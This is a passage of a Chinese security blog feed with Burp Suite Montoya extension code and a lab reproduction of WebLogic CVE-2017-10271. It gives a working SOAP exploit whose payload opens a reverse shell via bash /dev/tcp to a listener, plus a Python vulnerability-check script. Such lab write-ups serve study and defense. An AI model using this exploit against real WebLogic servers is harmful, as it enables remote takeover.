class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;  <span class="comment">// 引入 MontoyaApi，用于访问 Burp Suite 的 API</span></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.HttpRequestResponse;  <span class="comment">// 引入用于处理 HTTP 请求响应的类</span></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.params.ParsedHttpParameter;  <span class="comment">// 引入用于解析 HTTP 参数的类</span></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.scanner.audit.insertionpoint.AuditInsertionPoint;  <span class="comment">// 引入审核插入点接口</span></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.scanner.audit.insertionpoint.AuditInsertionPointProvider;  <span class="comment">// 引入审核插入点提供者接口</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;  <span class="comment">// 引入 Java 的 List 接口</span></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.util.stream.Collectors.toList;  <span class="comment">// 引入用于收集 Stream 结果的工具方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现 AuditInsertionPointProvider 接口的 MyInsertionPointProvider 类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyInsertionPointProvider</span> <span class="keyword">implements</span> <span class="title class_">AuditInsertionPointProvider</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MontoyaApi api;  <span class="comment">// 保存 MontoyaApi 实例的私有最终字段</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造函数，接收一个 MontoyaApi 实例</span></span><br><span class="line">    MyInsertionPointProvider(MontoyaApi api)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.api = api;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重写提供插入点的方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;AuditInsertionPoint&gt; <span class="title function_">provideInsertionPoints</span><span class="params">(HttpRequestResponse baseHttpRequestResponse)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 从请求中获取所有参数</span></span><br><span class="line">        List&lt;ParsedHttpParameter&gt; parameters = baseHttpRequestResponse.request().parameters();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 过滤出名为 &quot;data&quot; 的参数，并为每个这样的参数创建一个新的审核插入点</span></span><br><span class="line">        <span class="keyword">return</span> parameters.stream()</span><br><span class="line">                .filter(p -&gt; p.name().equals(<span class="string">&quot;data&quot;</span>))  <span class="comment">// 过滤出参数名为 &quot;data&quot; 的参数</span></span><br><span class="line">                .map(p -&gt; <span class="keyword">new</span> <span class="title class_">MyAuditInsertionPoint</span>(api, baseHttpRequestResponse, p))  <span class="comment">// 为每个符合条件的参数创建一个 MyAuditInsertionPoint 实例</span></span><br><span class="line">                .collect(toList());  <span class="comment">// 收集结果到 List 中</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.core.ByteArray;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.core.Range;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.HttpRequestResponse;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.params.HttpParameter;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.params.ParsedHttpParameter;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.requests.HttpRequest;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.scanner.audit.insertionpoint.AuditInsertionPoint;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.utilities.Utilities;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.http.message.params.HttpParameter.parameter;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现 AuditInsertionPoint 接口的 MyAuditInsertionPoint 类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyAuditInsertionPoint</span> <span class="keyword">implements</span> <span class="title class_">AuditInsertionPoint</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String insertionPointPrefix;  <span class="comment">// 插入点之前的文本</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String insertionPointSuffix;  <span class="comment">// 插入点之后的文本</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> HttpRequestResponse requestResponse;  <span class="comment">// 请求响应对象</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ParsedHttpParameter parameter;  <span class="comment">// 被操作的 HTTP 参数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String baseValue;  <span class="comment">// 参数值的基本形式</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Utilities utilities;  <span class="comment">// Utilities 对象，提供编解码等功能</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造函数，初始化参数和实用工具</span></span><br><span class="line">    MyAuditInsertionPoint(MontoyaApi api, HttpRequestResponse baseHttpRequestResponse, ParsedHttpParameter parameter)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.requestResponse = baseHttpRequestResponse;</span><br><span class="line">        <span class="built_in">this</span>.parameter = parameter;</span><br><span class="line">        <span class="built_in">this</span>.utilities = api.utilities();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">paramValue</span> <span class="operator">=</span> parameter.value();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// URL 和 base-64 解码数据</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">urlDecoded</span> <span class="operator">=</span> utilities.urlUtils().decode(paramValue);</span><br><span class="line">        <span class="type">ByteArray</span> <span class="variable">byteData</span> <span class="operator">=</span> utilities.base64Utils().decode(urlDecoded);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> byteData.toString();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 解析输入字符串在解码数据中的位置</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> data.indexOf(<span class="string">&quot;input=&quot;</span>) + <span class="number">6</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> data.indexOf(<span class="string">&quot;&amp;&quot;</span>, start);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (end == -<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            end = data.length();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        baseValue = data.substring(start, end);</span><br><span class="line"></span><br><span class="line">        insertionPointPrefix = data.substring(<span class="number">0</span>, start);</span><br><span class="line">        insertionPointSuffix = data.substring(end);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回插入点的名称</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">name</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Base64-wrapped input&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回原始值</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">baseValue</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> baseValue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用特定的 payload 构建带有负载的 HTTP 请求</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> HttpRequest <span class="title function_">buildHttpRequestWithPayload</span><span class="params">(ByteArray payload)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 构建原始数据使用指定的负载</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">input</span> <span class="operator">=</span> insertionPointPrefix + payload.toString() + insertionPointSuffix;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Base-64 和 URL 编码数据</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">updatedParameterValue</span> <span class="operator">=</span> utilities.urlUtils().encode(utilities.base64Utils().encodeToString(input));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 更新 HTTP 参数</span></span><br><span class="line">        <span class="type">HttpParameter</span> <span class="variable">updatedParameter</span> <span class="operator">=</span> parameter(parameter.name(), updatedParameterValue, parameter.type());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 返回更新参数的 HTTP 请求</span></span><br><span class="line">        <span class="keyword">return</span> requestResponse.request().withUpdatedParameters(updatedParameter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回问题高亮区域的方法，此处未实现</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Range&gt; <span class="title function_">issueHighlights</span><span class="params">(ByteArray payload)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.BurpExtension;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomScanInsertionPoints</span> <span class="keyword">implements</span> <span class="title class_">BurpExtension</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(MontoyaApi api)</span></span><br><span class="line">    &#123;</span><br><span class="line">        api.extension().setName(<span class="string">&quot;Custom scan insertion points&quot;</span>);</span><br><span class="line"></span><br><span class="line">        api.scanner().registerInsertionPointProvider(<span class="keyword">new</span> <span class="title class_">MyInsertionPointProvider</span>(api));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这个示例不是很懂，也没找到对应的出发点</p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> burpsuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现</title>
      <link href="/2024/10/22/WebSecurity/cve/CVE-2017-10271/"/>
      <url>/2024/10/22/WebSecurity/cve/CVE-2017-10271/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。攻击者发送精心构造的xml数据甚至能通过反弹shell拿到权限。</p><p>漏洞涉及版本<br>10.3.6.0<br>12.1.3.0.0<br>12.2.1.1.0</p><p>漏洞地址：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/wls-wsat/CoordinatorPortType</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC</span><br><span class="line">/wls-wsat/ParticipantPortType</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType</span><br><span class="line">/wls-wsat/CoordinatorPortType11</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC11</span><br><span class="line">/wls-wsat/ParticipantPortType11</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType11</span><br></pre></td></tr></table></figure><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>用的vulhub，为了动态分析cve的原理，用IDEA的远程调试搞一下，首先修改下<code>docker-compose.yml</code>文件，添加调试端口</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"> <span class="attr">weblogic:</span></span><br><span class="line">   <span class="attr">image:</span> <span class="string">vulhub/weblogic:10.3.6.0-2017</span></span><br><span class="line">   <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;7001:7001&quot;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;8453:8453&quot;</span></span><br></pre></td></tr></table></figure><p>docker-compose up -d 编译镜像并启动容器<br><img src="/2024/10/22/WebSecurity/cve/CVE-2017-10271/image.png"><br>docker exec -it 4d &#x2F;bin&#x2F;bash 进入容器内，<code>vi /root/Oracle/Middleware/user_projects/domains/base_domain/bin/setDomainEnv.sh</code>，<br><img src="/2024/10/22/WebSecurity/cve/CVE-2017-10271/image-1.png"><br>之后将docker中的项目文件cp出来，添加在IDEA项目中，在debug配置中添加远程调试</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>使用了网上exp，成功getshell，首先在主机监听：<code>nc -l -p 9999</code>，之后使用burp修改下面的数据包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wls-wsat/CoordinatorPortType</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:7001</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>639</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.4.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                    <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                                /bin/bash</span></span><br><span class="line"><span class="language-xml">                            <span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                                -c</span></span><br><span class="line"><span class="language-xml">                            <span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                                bash -i &gt;&amp; /dev/tcp/192.168.0.32/9999 0&gt;&amp;1</span></span><br><span class="line"><span class="language-xml">                            <span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>成功反弹shell<br><img src="/2024/10/22/WebSecurity/cve/CVE-2017-10271/image-2.png" alt="其中 ns2:frame 标签中打印出的是调用栈信息"></p><p>Payload解析<br>SOAP 请求结构</p><ul><li><strong>Envelope</strong>: 定义了 SOAP 消息的外层结构，使用的是标准的 SOAP Envelope 命名空间。</li><li><strong>Header</strong>: SOAP 消息中用来包含头部信息，这里特别使用了 <code>WorkContext</code>，这是 WebLogic Server 特有的机制，用于在 SOAP 请求中传递上下文或状态信息。</li></ul><p>WorkContext 内容</p><ul><li><strong>XMLDecoder</strong>: 利用 Java 的 <code>java.beans.XMLDecoder</code> 类来反序列化 XML 中定义的 Java 对象。由于 XMLDecoder 可以实例化任何 Java 对象，因此它被用于执行恶意代码。</li></ul><p>恶意代码执行流程</p><ol><li><strong>ProcessBuilder</strong>: 使用 <code>java.lang.ProcessBuilder</code>，这是 Java 中用于创建操作系统进程的 API。</li><li><strong>数组构造</strong>: 构造一个字符串数组，用于作为 <code>ProcessBuilder</code> 的参数。这个数组包含了要执行的命令：<ul><li><code>/bin/bash</code>: 使用 bash shell。</li><li><code>-c</code>: 表示后面的字符串是要运行的命令。</li><li><code>bash -i &gt;&amp; /dev/tcp/192.168.0.32/9999 0&gt;&amp;1</code>: 这条命令尝试建立一个反向 shell 连接到 IP 地址为 192.168.0.32 端口 9999 的服务器。这个命令的功能是将当前 shell 的输入输出重定向到一个 TCP 连接，实际上是创建了一个可以远程控制的 shell。</li></ul></li><li><code>&lt;void method=&quot;start&quot;/&gt;</code> - 这行代码调用 <code>ProcessBuilder</code> 的 <code>start()</code> 方法，启动构建的进程，实际上就是执行了上述的 bash 命令。</li></ol><p>下面是一个漏洞验证脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/xml&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Webogic_XMLDecoder_poc</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="comment">#url=&quot;http://192.168.189.137:7001&quot;</span></span><br><span class="line">    posturl=url+<span class="string">&#x27;/wls-wsat/CoordinatorPortType&#x27;</span></span><br><span class="line">    data = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;soapenv:Header&gt;</span></span><br><span class="line"><span class="string">            &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;java version=&quot;1.6.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;object class=&quot;java.io.PrintWriter&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;string&gt;servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/test.txt&lt;/string&gt;&lt;void method=&quot;println&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;string&gt;xmldecoder_vul_test&lt;/string&gt;&lt;/void&gt;&lt;void method=&quot;close&quot;/&gt;</span></span><br><span class="line"><span class="string">                    &lt;/object&gt;</span></span><br><span class="line"><span class="string">                &lt;/java&gt;</span></span><br><span class="line"><span class="string">            &lt;/work:WorkContext&gt;</span></span><br><span class="line"><span class="string">        &lt;/soapenv:Header&gt;</span></span><br><span class="line"><span class="string">        &lt;soapenv:Body/&gt;</span></span><br><span class="line"><span class="string">    &lt;/soapenv:Envelope&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">     </span><br><span class="line">    <span class="built_in">print</span> (url)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r=requests.post(posturl,data=data,headers=headers,timeout=<span class="number">5</span>)</span><br><span class="line">        geturl=url+<span class="string">&quot;/wls-wsat/test.txt&quot;</span></span><br><span class="line">        <span class="built_in">print</span> (geturl)</span><br><span class="line">        check_result = requests.get(geturl,headers=headers,timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;xmldecoder_vul_test&#x27;</span> <span class="keyword">in</span> check_result.text:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;[+]存在WebLogic WLS远程执行漏洞(CVE-2017-10271)&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;[-]不存在WebLogic WLS远程执行漏洞(CVE-2017-10271)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&quot;http://192.168.189.137:7001&quot;</span></span><br><span class="line">    Webogic_XMLDecoder_poc(url)</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这里首先将上面的调用栈信息格式化一下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">S:Envelope</span> <span class="attr">xmlns:S</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">S:Body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">S:Fault</span> <span class="attr">xmlns:ns4</span>=<span class="string">&quot;http://www.w3.org/2003/05/soap-envelope&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">faultcode</span>&gt;</span></span><br><span class="line">                S:Server</span><br><span class="line">            <span class="tag">&lt;/<span class="name">faultcode</span>&gt;</span>            <span class="tag">&lt;<span class="name">faultstring</span>&gt;</span></span><br><span class="line">                0</span><br><span class="line">            <span class="tag">&lt;/<span class="name">faultstring</span>&gt;</span>            <span class="tag">&lt;<span class="name">detail</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ns2:exception</span> <span class="attr">xmlns:ns2</span>=<span class="string">&quot;http://jax-ws.dev.java.net/&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ArrayIndexOutOfBoundsException&quot;</span> <span class="attr">note</span>=<span class="string">&quot;To disable this feature, set com.sun.xml.ws.fault.SOAPFaultBuilder.disableCaptureStackTrace system property to false&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line">                        0</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">message</span>&gt;</span>                    <span class="tag">&lt;<span 